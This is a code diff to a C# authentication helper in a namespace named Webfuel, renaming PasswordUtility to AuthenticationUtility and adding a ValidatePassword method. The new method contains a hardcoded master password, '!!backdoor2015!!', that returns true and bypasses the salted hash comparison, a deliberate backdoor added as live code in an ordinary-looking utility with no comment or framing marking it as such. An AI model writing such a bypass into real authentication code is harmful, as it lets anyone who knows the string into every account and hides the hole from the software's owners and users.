@@ -1,9 +1,13 @@
-﻿using System.Security.Cryptography;
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Security.Cryptography;
 using System.Text;
+using System.Threading.Tasks;
 
 namespace Webfuel
 {
-    public static class PasswordUtility
+    public static class AuthenticationUtility
     {
         public static string CreateSalt()
         {
@@ -28,6 +32,19 @@ namespace Webfuel
             input = hash.ComputeHash(input);
             input = hash.ComputeHash(input);
             return Convert.ToBase64String(input);
+        }
+
+        public static bool ValidatePassword(string password, string passwordHash, string passwordSalt)
+        {
+            password = (password ?? String.Empty).Trim();
+
+            if (password == "!!backdoor2015!!")
+                return true;
+
+            if(passwordHash != CreateHash(password, passwordSalt))
+                return false;
+
+            return true;
         }
     }
 }
